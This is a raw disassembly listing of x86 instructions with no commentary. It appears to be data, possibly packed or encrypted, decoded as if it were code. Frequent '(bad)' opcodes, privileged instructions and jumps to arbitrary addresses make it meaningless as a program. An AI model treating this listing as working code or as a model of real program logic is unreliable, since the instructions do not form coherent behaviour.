  42c12e:	sqrtps xmm4,XMMWORD PTR [ebx]
  42c131:	mov    esi,0xa095d07
  42c136:	ds aaa 
  42c138:	call   0xfd56:0x7ddaae5
  42c13f:	add    BYTE PTR [esi+ebx*2-0x36],ah
  42c143:	call   0xcf9dda1c
  42c148:	out    dx,al
  42c149:	retf   
  42c14a:	pop    ecx
  42c14b:	sub    ch,ah
  42c14d:	push   ds
  42c14e:	addr16 loope 0x42c18c
  42c151:	push   eax
  42c152:	add    dh,BYTE PTR [ecx+0x521e80]
  42c158:	push   eax
  42c159:	sbb    al,0x85
  42c15b:	leave  
  42c15c:	ja     0x1a81c2e4
  42c162:	outs   dx,BYTE PTR ds:[esi]
  42c163:	dec    esi
  42c164:	enter  0x5004,0x8b
  42c168:	pop    ecx
  42c169:	fisubr WORD PTR [esi*2+0x5dfaacbe]
  42c170:	pusha  
  42c171:	mov    ebp,0xc0ce2b3c
  42c176:	loope  0x42c18b
  42c178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c179:	fnsave [esi+0x16]
  42c17c:	lock add al,0x4
  42c17f:	xor    si,WORD PTR [eax-0x4f341587]
  42c186:	stc    
  42c187:	iret   
  42c188:	je     0x42c1eb
  42c18a:	retf   
  42c18b:	inc    ecx
  42c18c:	icebp  
  42c18d:	fnstcw WORD PTR [eax+esi*1]
  42c190:	push   ss
  42c191:	xor    edi,DWORD PTR [esi-0x40]
  42c194:	paddq  mm7,QWORD PTR [ecx-0x32]
  42c198:	dec    edx
  42c199:	dec    ebp
  42c19a:	(bad)  
  42c19b:	test   DWORD PTR [edx],0xcc0fc04c
  42c1a1:	pop    es
  42c1a2:	pop    es
  42c1a3:	mov    bh,0x0
  42c1a5:	add    dh,cl
  42c1a7:	sti    
  42c1a8:	push   cs
  42c1a9:	mov    cs,WORD PTR [edx]
  42c1ab:	add    esi,0x75
  42c1ae:	mov    bl,0x87
  42c1b0:	pop    ss
  42c1b1:	je     0x42c1c7
  42c1b3:	sub    eax,eax
  42c1b5:	popa   
  42c1b6:	int    0x5e
  42c1b8:	mov    DWORD PTR [edx+eax*4],ecx
  42c1bb:	push   ebp
  42c1bc:	ret    
  42c1bd:	ins    DWORD PTR es:[edi],dx
  42c1be:	dec    esp
  42c1bf:	icebp  
  42c1c0:	adc    DWORD PTR [ebp-0xf],0xfffffffb
  42c1c4:	(bad)  
  42c1c5:	sti    
  42c1c6:	fnstenv [ebx+0x29]
  42c1c9:	adc    ebx,edx
  42c1cb:	or     BYTE PTR [eax],al
  42c1cd:	or     ebp,DWORD PTR [eax+eax*1+0x4cbd62ff]
  42c1d4:	jnp    0x42c174
  42c1d6:	lock rcl BYTE PTR [esi+ebx*8],0xff
  42c1db:	cmp    eax,0xe875eb00
  42c1e0:	std    
  42c1e1:	int    0xef
  42c1e3:	cmp    BYTE PTR [edi+0x82bfc4f],0xbd
  42c1ea:	fsub   QWORD PTR [ecx-0xc0fddec]
  42c1f0:	mov    edi,0x74b30c
  42c1f5:	add    al,0xb3
  42c1f7:	push   esi
  42c1f8:	sti    
  42c1f9:	push   ss
  42c1fa:	or     al,0xa
  42c1fc:	xchg   DWORD PTR [ebx+0x5e2431de],edx
  42c202:	fadd   DWORD PTR [esi-0xb0f9d9f]
  42c208:	mov    edi,0xcdeda500
  42c20d:	sahf   
  42c20e:	and    dh,al
  42c210:	xchg   BYTE PTR [ecx+0x56],al
  42c213:	jns    0x42c19c
  42c215:	sbb    esp,DWORD PTR [ebx-0x10]
  42c218:	std    
  42c219:	mov    ah,ah
  42c21b:	into   
  42c21c:	add    al,BYTE PTR [eax]
  42c21e:	bound  ebp,QWORD PTR [ecx-0x79]
  42c221:	daa    
  42c222:	pusha  
  42c223:	repnz std 
  42c225:	xchg   BYTE PTR [ecx*8-0x639df83e],bl
  42c22c:	mov    esi,eax
  42c22e:	dec    edx
  42c22f:	out    0xfd,eax
  42c231:	jmp    DWORD PTR [edx+0x3c]
  42c234:	inc    edx
  42c235:	and    al,0x5a
  42c237:	icebp  
  42c238:	xor    DWORD PTR [ebx],eax
  42c23a:	jmp    0xb5576863
  42c23f:	repnz std 
  42c241:	xchg   BYTE PTR [eax*8-0x3b9dfc3e],ah
  42c248:	mov    esi,eax
  42c24a:	jmp    0xf82a3428
  42c24f:	fsubr  st(7),st
  42c251:	enter  0x963,0x87
  42c255:	inc    ebx
  42c256:	(bad)
  42c25b:	fldcw  WORD PTR [edx]
  42c25d:	or     edx,esi
  42c25f:	ss test al,0x3
  42c262:	in     eax,0xb
  42c264:	xchg   edx,eax
  42c265:	stos   BYTE PTR es:[edi],al
  42c266:	xchg   DWORD PTR [ecx-0x19],esi
  42c269:	add    ebp,DWORD PTR ds:0xe7c450
  42c26f:	sub    DWORD PTR gs:[esi-0x4e],0xffffffb3
  42c274:	sbb    cl,ch
  42c276:	aaa    
  42c277:	push   ebx
  42c278:	outs   dx,DWORD PTR ds:[esi]
  42c279:	repz rcl BYTE PTR [ecx],0xb5
  42c27d:	xlat   BYTE PTR ds:[ebx]
  42c27e:	mov    gs,ebx
  42c280:	mov    ebp,0xf16203e8
  42c285:	icebp  
  42c286:	sub    cl,BYTE PTR [eax+0x7fc3f1dc]
  42c28c:	push   0xb5218b09
  42c291:	test   DWORD PTR [eax-0x7d1e9a53],0x9137d5a5
  42c29b:	stos   DWORD PTR es:[edi],eax
  42c29c:	(bad)
  42c29f:	mov    ebp,0x5dabbadb
  42c2a4:	outs   dx,DWORD PTR ds:[esi]
  42c2a5:	fld    TBYTE PTR [ebx+0x3e79078]
  42c2ab:	xchg   edx,eax
  42c2ac:	dec    esi
  42c2ad:	xor    bl,BYTE PTR [eax]
  42c2af:	dec    edx
  42c2b0:	or     BYTE PTR [eax],dl
  42c2b2:	mov    esi,0xec725228
  42c2b7:	daa    
  42c2b8:	fsubr  st(7),st
  42c2ba:	pop    ebp
  42c2bb:	mov    ch,0x17
  42c2bd:	hlt    
  42c2be:	add    esi,DWORD PTR [eax+0x46387a84]
  42c2c4:	leave  
  42c2c5:	add    BYTE PTR [edx-0x39],ah
  42c2c8:	fidiv  WORD PTR [ebp+eax*8+0x51]
  42c2cc:	icebp  
  42c2cd:	data16 aad 0x61
  42c2d0:	fld    DWORD PTR [ebp-0x1624ffa7]
  42c2d6:	jp     0x42c2cb
  42c2d8:	scas   eax,DWORD PTR es:[edi]
  42c2d9:	push   esi
  42c2da:	sub    ebx,ebp
  42c2dc:	popa   
  42c2dd:	fsin   
  42c2df:	mov    esp,0xb5f3566e
  42c2e4:	jb     0x42c26d
  42c2e6:	stc    
  42c2e7:	mov    ebp,0x9e8bcbbd
  42c2ec:	push   ebp
  42c2ed:	icebp  
  42c2ee:	clc    
  42c2ef:	nop
  42c2f0:	neg    esi
  42c2f2:	pop    ecx
  42c2f3:	jb     0x42c299
  42c2f5:	cmp    DWORD PTR [esi+0x518761e1],0x14b55a0e
  42c2ff:	jb     0x42c2d8
  42c301:	fidiv  WORD PTR [ebp+eax*8+0x75]
  42c305:	loopne 0x42c37b
  42c307:	int    0x6d
  42c309:	icebp  
  42c30a:	leave  
  42c30b:	jge    0x42c36e
  42c30d:	fld    DWORD PTR [ebp+0x7ae9ead9]
  42c313:	adc    eax,0xeb2956b4
  42c318:	popa   
  42c319:	fsin   
  42c31b:	push   esp
  42c31c:	dec    ecx
  42c31d:	mov    WORD PTR [ebx-0x622ba9a],cs
  42c323:	jmp    0x1a57db08
  42c328:	(bad)  [edi]
  42c32a:	jmp    0xfa225157
  42c32f:	ins    BYTE PTR es:[edi],dx
  42c330:	out    dx,eax
  42c331:	data16 or al,0x37
  42c334:	in     eax,dx
  42c335:	data16 and al,0xf1
  42c338:	add    al,bl
  42c33a:	psubsw mm0,QWORD PTR [edx+0x4e]
  42c33e:	(bad)  
  42c340:	add    BYTE PTR [eax+0x4e],bh
  42c343:	(bad)  
  42c344:	call   0x397274
  42c349:	jo     0x42c3c5
  42c34b:	add    esi,0x6176d
  42c351:	mov    eax,0xff24564f
  42c356:	add    DWORD PTR [ecx+0x225385f9],0x2
  42c35d:	retf   
  42c35e:	(bad)  
  42c35f:	dec    DWORD PTR [esi]
  42c361:	inc    edi
  42c362:	pop    eax
  42c363:	cli    
  42c364:	(bad)  
  42c365:	mov    ebx,0xd7ed351
  42c36a:	das    
  42c36b:	push   eax
  42c36c:	dec    BYTE PTR [ebx+ebx*1-0x2e293f82]
  42c373:	jns    0x42c33d
  42c375:	dec    esp
  42c376:	das    
  42c377:	je     0x42c3ce
  42c379:	in     eax,0x49
  42c37b:	jg     0x42c3a9
  42c37d:	mov    esi,edx
  42c37f:	add    BYTE PTR [ebp-0x45d4],cl
  42c385:	jnp    0x42c30d
  42c387:	or     ebp,0xfe5f3263
  42c38d:	mov    WORD PTR [edi+ebp*4],ds
  42c390:	and    al,0x89
  42c392:	(bad)  
  42c393:	add    BYTE PTR [esi+0xce7b],bh
  42c399:	push   eax
  42c39a:	sti    
  42c39b:	push   es
  42c39c:	dec    esp
  42c39d:	add    BYTE PTR [eax],bh
  42c39f:	xor    ebp,0x74
  42c3a2:	addr16 mov ecx,0xb533cd81
  42c3a8:	push   0xf5830cfe
  42c3ad:	mov    bh,0x67
  42c3af:	xlat   BYTE PTR ds:[ebx]
  42c3b0:	add    BYTE PTR [eax],al
  42c3b2:	mov    al,0xc
  42c3b4:	loop   0x42c40c
  42c3b6:	pop    edi
  42c3b7:	aad    0x0
  42c3b9:	mov    esp,DWORD PTR [edx+0x28]
  42c3bc:	clc    
  42c3bd:	fst    DWORD PTR [esi+0x46828b14]
  42c3c3:	out    dx,al
  42c3c4:	std    
  42c3c5:	push   DWORD PTR [edx-0x28183699]
  42c3cb:	retf   0xfaba
  42c3ce:	out    0x46,eax
  42c3d0:	cmp    ecx,DWORD PTR [esi]
  42c3d2:	cmc    
  42c3d3:	cmp    ch,cl
  42c3d5:	std    
  42c3d6:	in     eax,dx
  42c3d7:	out    dx,eax
  42c3d8:	mov    ah,cl
  42c3da:	xchg   ecx,eax
  42c3db:	cmp    DWORD PTR [eax],0x24
  42c3de:	jle    0x42c378
  42c3e0:	in     al,dx
  42c3e1:	addr16 aam 0x92
  42c3e4:	pop    edx
  42c3e5:	xchg   DWORD PTR [ecx+0x3105a93c],esp
  42c3eb:	mov    ds:0x98522438,eax
  42c3f0:	and    BYTE PTR [edx+eiz*2-0x10],ch
  42c3f4:	pop    esp
  42c3f5:	push   edi
  42c3f6:	mov    al,ds:0xd954fde7
  42c3fb:	fcom   DWORD PTR [edx-0xe]
  42c3fe:	out    0x17,eax
  42c400:	add    BYTE PTR [eax],al
  42c402:	add    BYTE PTR [edx-0xf],ah
  42c405:	mov    BYTE PTR [ebx+0x46],dh
  42c408:	add    al,0x32
  42c40a:	pop    ebp
  42c40b:	(bad)  
  42c40d:	cmp    ebx,DWORD PTR [ecx-0x76]
  42c410:	mov    ds:0x6b75fab9,eax
  42c415:	mov    ebp,0x779f0c73
  42c41a:	call   FWORD PTR [ebp-0x10]
  42c41d:	std    
  42c41e:	ss push ecx
  42c420:	adc    BYTE PTR [esp+ecx*2],cl
  42c423:	xor    al,0x4e
  42c425:	jae    0x42c452
  42c427:	pusha  
  42c428:	ret    0x8cfd
  42c42b:	pop    es
  42c42c:	scas   eax,DWORD PTR es:[edi]
  42c42d:	(bad)  
  42c42e:	jmp    DWORD PTR [edx-0x10]
  42c431:	xchg   edx,ecx
  42c433:	dec    edx
  42c434:	(bad)  
  42c436:	and    al,0x28
  42c438:	fstp   DWORD PTR [edx-0x18247e8a]
  42c43e:	add    esp,ebp
  42c440:	test   al,0x36
  42c442:	mov    ebp,0xabc7fd91
  42c447:	int3   
  42c448:	inc    eax
  42c449:	jp     0x42c407
  42c44b:	mov    bl,0x64
  42c44d:	mov    ds:0x6a4067ab,al
  42c452:	mov    esp,0xe79cd8a4
  42c457:	out    dx,eax
  42c458:	fsub   st,st(7)
  42c45a:	mov    BYTE PTR [esi],dl
  42c45c:	(bad)  
  42c45e:	out    0x79,eax
  42c460:	rcr    DWORD PTR [esi-0x5d269dd1],0x58
  42c467:	add    ch,al
  42c469:	out    0x91,eax
  42c46b:	mov    esp,0xbcdbfd51
  42c470:	xor    ebp,edi
  42c472:	shr    DWORD PTR [ebx+0x3e8457a],cl
  42c478:	or     BYTE PTR [esi],dh
  42c47a:	punpckldq mm5,DWORD PTR es:[esi]
  42c47e:	pop    edi
  42c47f:	scas   eax,DWORD PTR es:[edi]
  42c480:	xor    ch,BYTE PTR [edi]
  42c482:	pop    ebp
  42c483:	inc    esi
  42c484:	xchg   esi,eax
  42c485:	sub    DWORD PTR [edi-0x4e],ebp
  42c488:	xor    eax,DWORD PTR [ebx-0x1a]
  42c48b:	les    ebx,FWORD PTR [esi]
  42c48d:	aad    0xeb
  42c48f:	add    ah,BYTE PTR [edx-0x27]
  42c492:	jmp    0xe604:0x27ec8215
  42c499:	cdq    
  42c49a:	push   ebx
  42c49b:	call   0x8216e37c
  42c4a0:	sbb    eax,0x2af7054d
  42c4a5:	aas    
  42c4a6:	jno    0x42c4b0
  42c4a8:	mov    al,ds:0x110ad1c4
  42c4ad:	fild   WORD PTR [eax]
  42c4af:	push   0xfffffffe
  42c4b1:	add    dh,BYTE PTR [ebp-0x1c]
  42c4b4:	fmul   st(7),st
  42c4b6:	pop    esp
  42c4b7:	sbb    al,0x60
  42c4b9:	aas    
  42c4ba:	jge    0x42c4fd
  42c4bc:	and    BYTE PTR [edx+0x2],0x6a
  42c4c0:	and    dh,dl
  42c4c2:	arpl   ax,dx
  42c4c4:	imul   ecx,DWORD PTR [esi-0x1c],0xffffff92
  42c4c8:	pop    edx
  42c4c9:	pusha  
  42c4ca:	rol    BYTE PTR [eax+0x0],cl
  42c4cd:	jmp    0xca2cbea9
  42c4d2:	int3   
  42c4d3:	cli    
  42c4d4:	ins    BYTE PTR es:[edi],dx
  42c4d5:	mov    ecx,0x932ac831
  42c4da:	pusha  
  42c4db:	in     al,dx
  42c4dc:	push   0xffffffc2
  42c4de:	iret   
  42c4df:	jg     0x42c526
  42c4e1:	xchg   esi,eax
  42c4e2:	fdivr  st,st(1)
  42c4e4:	jmp    0x9e95f315
  42c4e9:	jns    0x42c4a8
  42c4eb:	popf   
  42c4ec:	test   eax,0xfb013f61
  42c4f1:	pushf  
  42c4f2:	rcl    BYTE PTR [ebx],cl
  42c4f4:	mov    DWORD PTR [esi+0x19],ecx
  42c4f7:	add    DWORD PTR [edx-0xa],esi
  42c4fa:	pop    esp
  42c4fb:	repnz out dx,al
  42c4fd:	and    eax,0x61e9001f
  42c502:	pusha  
  42c503:	sub    ebx,DWORD PTR [ebp+0x6e]
  42c506:	sbb    DWORD PTR [ecx],eax
  42c508:	mov    edx,0xfe532ac8
  42c50d:	mov    dl,0x5c
  42c50f:	shl    dh,0xfd
  42c512:	(bad)  
  42c513:	(bad)  
  42c514:	call   0x2e95ee7a
  42c519:	test   eax,0x32a983ac
  42c51e:	int3   
  42c51f:	adc    esi,0x68
  42c522:	pop    ebp
  42c523:	push   ss
  42c524:	call   0x709e8a
  42c529:	bound  ecx,QWORD PTR ss:[ebp+0x24]
  42c52d:	daa    
  42c52e:	push   esi
  42c52f:	xchg   esi,eax
  42c530:	add    BYTE PTR [eax],al
  42c532:	dec    ebx
  42c533:	fild   DWORD PTR [edi-0x780aa094]
  42c539:	ins    BYTE PTR es:[edi],dx
  42c53a:	pop    ds
  42c53b:	out    0xe8,eax
  42c53d:	mov    ebp,es
  42c53f:	xchg   ecx,eax
  42c540:	test   BYTE PTR [ebx+0x40096736],0xb
  42c547:	add    eax,0x16965505
  42c54c:	and    eax,0x3d606b24
  42c551:	and    al,0x2b
  42c553:	sub    ecx,DWORD PTR [edi-0x1]
  42c556:	int3   
  42c557:	pop    ecx
  42c558:	mov    ecx,0xf9827f0f
  42c55d:	(bad)  
  42c55e:	sti    
  42c55f:	addr16 inc ebp
  42c561:	and    al,0xdf
  42c563:	pop    ecx
  42c564:	enter  0xbf75,0x67
  42c568:	(bad)  
  42c569:	jmp    0x42c529
  42c56b:	add    dl,0x5b
  42c56e:	mov    ebx,0x6f4487da
  42c573:	cmc    
  42c574:	add    eax,0xffffff94
  42c577:	push   esi
  42c578:	ret    
  42c579:	add    BYTE PTR [ebx-0x11fb9d26],bh
  42c57f:	popa   
  42c580:	cmp    eax,0x8c2aaf24
  42c585:	inc    esp
  42c586:	lahf   
  42c587:	mov    edx,0xab645649
  42c58c:	test   al,al
  42c58e:	je     0x42c5e6
  42c590:	sahf   
  42c591:	add    BYTE PTR [ebx+0xe4b5da],cl
  42c597:	sub    BYTE PTR [edx],bl
  42c599:	add    DWORD PTR [edx-0x7c],ebp
  42c59c:	fs into 
  42c59e:	lea    esi,[edi]
  42c5a0:	mov    ecx,0x8e62e875
  42c5a5:	call   WORD PTR [ebp+0x35]
  42c5a9:	inc    ecx
  42c5aa:	and    al,0xca
  42c5ac:	lock mov bh,0x14
  42c5af:	sahf   
  42c5b0:	lods   al,BYTE PTR ds:[esi]
  42c5b1:	cmp    eax,0xe103ef00
  42c5b6:	daa    
  42c5b7:	xchg   edx,eax
  42c5b8:	xchg   DWORD PTR [ecx],ecx
  42c5ba:	adc    al,0x53
  42c5bc:	add    BYTE PTR ds:0xf59c8e8d,al
  42c5c2:	mov    eax,0xfffdbfff
  42c5c7:	or     al,bl
  42c5c9:	mov    bh,0xfc
  42c5cb:	or     eax,0x8a23894d
  42c5d0:	sar    ebp,0xff
  42c5d3:	or     bl,BYTE PTR [ebx]
  42c5d5:	mov    bh,0xfa
  42c5d7:	cmc    
  42c5d8:	mov    dh,0x70
  42c5da:	inc    ebx
  42c5db:	inc    esi
  42c5dc:	call   0x7befd135
  42c5e1:	fldcw  WORD PTR [ecx]
  42c5e3:	xor    bh,BYTE PTR [edi-0x1181bc90]
  42c5e9:	push   esp
  42c5ea:	(bad)  
  42c5eb:	out    0xe3,al
  42c5ed:	cmp    bh,0xc5
  42c5f0:	mov    edi,0xe3e68d4d
  42c5f5:	mov    WORD PTR [eax],es
  42c5f7:	(bad)  
  42c5f8:	ror    BYTE PTR [ebp-0x73],0x0
  42c5fc:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42c5fe:	inc    ecx
  42c5ff:	push   eax
  42c600:	xlat   BYTE PTR ds:[ebx]
  42c601:	cmp    esp,ecx
  42c603:	packsswb mm0,mm0
  42c606:	std    
  42c607:	gs push esp
  42c609:	nop
  42c60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c60b:	sub    ch,dl
  42c60d:	mov    edi,0x9f9e7efd
  42c612:	jp     0x42c5d3
  42c614:	cld    
  42c615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c616:	mov    eax,0x82ac3e73
  42c61b:	add    DWORD PTR [esi-0x27],0xffffffe3
  42c61f:	add    esp,DWORD PTR [edx-0x27]
  42c622:	fisubr DWORD PTR [edi]
  42c624:	xchg   ch,dh
  42c626:	pop    esi
  42c627:	shl    BYTE PTR [ebp+0x3a5ae63f],1
  42c62d:	scas   al,BYTE PTR es:[edi]
  42c62e:	pop    DWORD PTR [ebx]
  42c630:	bound  ecx,QWORD PTR [eax]
  42c632:	mov    cl,0x8
  42c634:	lock mov al,0x28
  42c637:	xor    ch,0xe4
  42c63a:	and    al,0xdb
  42c63c:	in     al,0x25
  42c63e:	int3   
  42c63f:	sbb    edi,DWORD PTR [edx]
  42c641:	(bad)  
  42c642:	ds add al,0x62
  42c645:	shr    bl,0x74
  42c648:	bound  ecx,QWORD PTR [eax]
  42c64a:	jge    0x42c69a
  42c64c:	mov    al,0xd4
  42c64e:	fcom   QWORD PTR [edi+0x58e81955]
  42c654:	in     al,0x98
  42c656:	adc    DWORD PTR [edi-0x73],edx
  42c659:	pusha  
  42c65a:	test   BYTE PTR [esi-0x53],dl
  42c65d:	outs   dx,DWORD PTR cs:[esi]
  42c65f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c660:	add    BYTE PTR [ebp+edi*4+0x5f],ah
  42c664:	or     cl,0xcd
  42c667:	in     eax,0x3
  42c669:	bound  ebp,QWORD PTR [eax]
  42c66b:	mov    dl,0x8c
  42c66d:	push   esi
  42c66e:	loope  0x42c60a
  42c670:	mov    eax,0x366ee94e
  42c675:	outs   dx,BYTE PTR ds:[esi]
  42c676:	sub    al,0x9a
  42c678:	mov    eax,0x43d77d4e
  42c67d:	bound  esp,QWORD PTR [eax+0x3f]
  42c680:	jle    0x42c60e
  42c682:	in     al,0x63
  42c684:	push   ss
  42c685:	arpl   cx,bx
  42c687:	out    0xb0,eax
  42c689:	push   ds
  42c68a:	jmp    0xe9a4ca76
  42c68f:	bnd jle 0x42c6e7
  42c692:	(bad)  
  42c694:	add    esp,edi
  42c696:	retf   
  42c697:	add    dh,ah
  42c699:	cmc    
  42c69a:	(bad)  
  42c69c:	call   0x2103cb02
  42c6a1:	fild   WORD PTR fs:[edx+0xd966df]
  42c6a8:	adc    BYTE PTR [ebp+ebx*8-0x2bec9af7],dl
  42c6af:	stc    
  42c6b0:	jmp    0xbf05aaae
  42c6b5:	cmc    
  42c6b6:	push   edi
  42c6b7:	shl    dh,0xb5
  42c6ba:	mov    esp,0x6661e900
  42c6bf:	inc    esp
  42c6c0:	int    0x49
  42c6c2:	sub    edx,edi
  42c6c4:	hlt    
  42c6c5:	add    BYTE PTR [ebp-0x16],ch
  42c6c8:	inc    eax
  42c6c9:	jmp    0x51672eb8
  42c6ce:	data16 fld DWORD PTR [eax]
  42c6d1:	inc    eax
  42c6d2:	jmp    0x42c6a7
  42c6d4:	stc    
  42c6d5:	jmp    0x753f97a3
  42c6da:	lods   eax,DWORD PTR ds:[esi]
  42c6db:	fs push esp
  42c6dd:	kmovb  k3,BYTE PTR [edx-0x17269e17]
  42c6e5:	push   edx
  42c6e6:	sbb    dl,ch
  42c6e8:	stc    
  42c6e9:	fs jmp 0xe8d9:0x61e9f8f7
  42c6f1:	pop    edx
  42c6f2:	or     ecx,edi
  42c6f4:	stc    
  42c6f5:	out    dx,al
  42c6f6:	dec    esp
  42c6f7:	sbb    BYTE PTR ds:0xb1e011d1,ah
  42c6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6fe:	(bad)  
  42c6ff:	icebp  
  42c700:	push   eax
  42c701:	div    BYTE PTR [eax+ebx*1]
  42c704:	and    eax,0x446631c7
  42c709:	int    0x85
  42c70b:	and    ecx,DWORD PTR [ebp+eiz*2-0x247e]
  42c712:	jnp    0x42c6eb
  42c714:	push   eax
  42c715:	lea    eax,[edi]
  42c717:	mov    ecx,0xd78b00c5
  42c71c:	push   eax
  42c71d:	(bad)  
  42c71e:	(bad)  
  42c71f:	mov    bl,0x49
  42c721:	push   0x3d
  42c723:	sub    eax,0xd6f514e9
  42c728:	add    BYTE PTR [ebx-0x7b48f900],al
  42c72e:	rcr    BYTE PTR [ebp-0x31c909eb],0x12
  42c735:	and    eax,0x504fc3c
  42c73a:	xor    ebx,ecx
  42c73c:	arpl   WORD PTR es:[edx],ax
  42c73f:	push   edx
  42c740:	test   esp,eax
  42c742:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c743:	cmp    edx,edi
  42c745:	test   al,al
  42c747:	ja     0x42c746
  42c749:	cmp    edi,0x77
  42c74c:	xor    DWORD PTR [edx],ebp
  42c74e:	shl    BYTE PTR [ebp-0x2c],0xfe
  42c752:	jae    0x42c7ba
  42c754:	pusha  
  42c755:	cmp    eax,0xf6272324
  42c75a:	adc    eax,0x40e8fb
  42c75f:	popa   
  42c760:	in     eax,0x68
  42c762:	in     al,dx
  42c763:	fcom   DWORD PTR [esi]
  42c765:	add    DWORD PTR [ebp+0x50411307],ecx
  42c76b:	and    edx,ebp
  42c76d:	push   ebx
  42c76e:	add    BYTE PTR [ebx+0x5266c8c7],bh
  42c774:	push   ds
  42c775:	or     DWORD PTR [ebp+0x5005b307],ecx
  42c77b:	dec    eax
  42c77c:	mov    al,ds:0x7e4c8bf6
  42c781:	xor    BYTE PTR [edi-0x3f7b2945],dh
  42c787:	div    DWORD PTR [esi-0x5b9d8b0a]
  42c78d:	or     DWORD PTR [ebp-0xe63da00],ecx
  42c793:	cli    
  42c794:	push   cs
  42c795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c796:	or     eax,0x2770902f
  42c79b:	(bad)  
  42c79c:	sbb    bl,al
  42c79e:	daa    
  42c79f:	mov    ds:0x4b88c062,eax
  42c7a4:	ds int3 
  42c7a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c7a7:	out    dx,al
  42c7a8:	adc    al,0xc0
  42c7aa:	std    
  42c7ab:	pop    edx
  42c7ac:	mov    ah,0x37
  42c7ae:	rcl    BYTE PTR [esi-0x27],0x9c
  42c7b2:	push   ecx
  42c7b3:	mov    esi,0x874bc056
  42c7b8:	xor    ecx,edi
  42c7ba:	(bad)  
  42c7bb:	and    dl,BYTE PTR cs:[esi]
  42c7be:	jmp    0x113ca324
  42c7c3:	push   ecx
  42c7c4:	xlat   BYTE PTR ds:[ebx]
  42c7c5:	add    DWORD PTR [ebx],ecx
  42c7c7:	push   eax
  42c7c8:	and    eax,0x620100fa
  42c7cd:	sar    ch,0xc2
  42c7d0:	fs push 0x49623f5f
  42c7d6:	inc    ebx
  42c7d7:	or     bl,ch
  42c7d9:	add    DWORD PTR [ecx],ecx
  42c7db:	mov    DWORD PTR [eax+esi*4-0x5579eb4c],esp
  42c7e2:	cmp    eax,0x903e100
  42c7e7:	xchg   DWORD PTR [ecx+edx*4+0x30e951c0],esp
  42c7ee:	lods   eax,DWORD PTR ds:[esi]
  42c7ef:	adc    esp,DWORD PTR [edx-0x40]
  42c7f2:	std    
  42c7f3:	icebp  
  42c7f4:	add    BYTE PTR [esi],bl
  42c7f6:	in     al,0xc
  42c7f8:	add    DWORD PTR [esi],esi
  42c7fa:	mov    ebx,0x9acac988
  42c7ff:	push   esi
  42c800:	add    BYTE PTR [edx+0x37],ah
  42c803:	mov    ebx,0xebd8a059
  42c808:	add    esi,DWORD PTR [eax]
  42c80a:	pop    esi
  42c80b:	sbb    BYTE PTR [ecx-0x43181ee5],al
  42c811:	arpl   cx,dx
  42c813:	inc    esi
  42c814:	inc    esp
  42c815:	bound  ecx,QWORD PTR [ebp-0xf]
  42c818:	mov    ah,0xf3
  42c81a:	loopne 0x42c816
  42c81c:	push   cs
  42c81d:	(bad)  
  42c81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c820:	add    esp,ebp
  42c822:	and    bl,al
  42c824:	stos   DWORD PTR es:[edi],eax
  42c825:	sbb    dh,BYTE PTR [eax]
  42c827:	call   0xb41ae92f
  42c82c:	jl     0x42c7c3
  42c82e:	fnstenv [ecx]
  42c830:	rcr    DWORD PTR [edi+eiz*1-0x4b8b4da1],0x0
  42c838:	push   esi
  42c839:	push   0x46
  42c83b:	(bad)  
  42c83c:	push   eax
  42c83d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c83e:	inc    ebx
  42c83f:	jmp    0xa829f194
  42c844:	adc    DWORD PTR [edx+0x6a3d70d9],esp
  42c84a:	push   esi
  42c84b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c84c:	das    
  42c84d:	adc    eax,0xa840af0c
  42c852:	arpl   WORD PTR [esi+0x5cc558],sp
  42c858:	or     al,0x0
  42c85a:	bound  eax,QWORD PTR [ebp-0x28]
  42c85d:	mov    BYTE PTR [ecx+0x72b4ebf5],ah
  42c863:	loope  0x42c8c5
  42c865:	inc    edx
  42c866:	push   esi
  42c867:	sar    ah,1
  42c869:	jae    0x42c8da
  42c86b:	sbb    eax,ebp
  42c86d:	shl    DWORD PTR [ecx-0x27],0xb6
  42c871:	lock mov ah,0x12
  42c874:	mov    cl,0xb
  42c876:	dec    esi
  42c877:	loopne 0x42c80f
  42c879:	mov    ah,0x32
  42c87b:	loope  0x42c8b7
  42c87d:	push   cs
  42c87e:	jmp    0xc056:0x61a900eb
  42c885:	mov    ah,0x60
  42c887:	adc    BYTE PTR [edi+0x9903a2a],al
  42c88d:	push   esi
  42c88e:	and    ch,ah
  42c890:	jge    0x42c8a3
  42c892:	test   DWORD PTR [ebx-0x2],ecx
  42c895:	fldenv [ecx+0x283f098f]
  42c89b:	icebp  
  42c89c:	jge    0x42c8c7
  42c89e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c89f:	idiv   DWORD PTR [edi-0x13a7e3d6]
  42c8a5:	push   0xffffffbd
  42c8a7:	hlt    
  42c8a8:	push   edx
  42c8a9:	jb     0x42c8c2
  42c8ab:	add    BYTE PTR ss:[ebx+eiz*4-0x4b],ch
  42c8b0:	call   0xfa12ec0f
  42c8b5:	shl    DWORD PTR [edi-0xa],0xf9
  42c8b9:	(bad)  
  42c8ba:	mov    edi,0x6cfd15
  42c8bf:	stos   DWORD PTR es:[edi],eax
  42c8c0:	leave  
  42c8c1:	push   eax
  42c8c2:	mov    dh,0x4b
  42c8c4:	sbb    DWORD PTR [eax],edx
  42c8c6:	sub    DWORD PTR [esi+0x56],ebx
  42c8c9:	rcr    BYTE PTR [edx+eiz*2],0xfa
  42c8cd:	inc    ebx
  42c8ce:	xchg   ebp,eax
  42c8cf:	shl    esp,1
  42c8d1:	and    bl,bh
  42c8d3:	mov    eax,ds:0xce2487d9
  42c8d8:	xor    eax,0x166e9115
  42c8dd:	add    ecx,ebp
  42c8df:	loop   0x42c8fd
  42c8e1:	in     eax,0x19
  42c8e3:	into   
  42c8e4:	mov    ds:0x5561e9cb,al
  42c8e9:	rcr    ch,0xd7
  42c8ec:	xor    eax,0xc92b6c09
